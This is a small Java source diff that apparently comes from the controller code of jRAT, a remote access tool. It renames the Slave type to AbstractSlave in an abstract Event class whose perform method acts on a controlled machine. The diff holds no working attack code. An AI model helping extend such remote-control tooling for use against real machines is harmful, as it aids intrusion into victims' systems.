@@ -1,6 +1,6 @@
 package su.jrat.client.events;
 
-import su.jrat.client.Slave;
+import su.jrat.client.AbstractSlave;
 
 public abstract class Event {
 
@@ -12,7 +12,7 @@ public abstract class Event {
 
 	public abstract Object[] getDisplayData();
 
-	public abstract void perform(Slave sl);
+	public abstract void perform(AbstractSlave sl);
 
 	public abstract String toString();
 
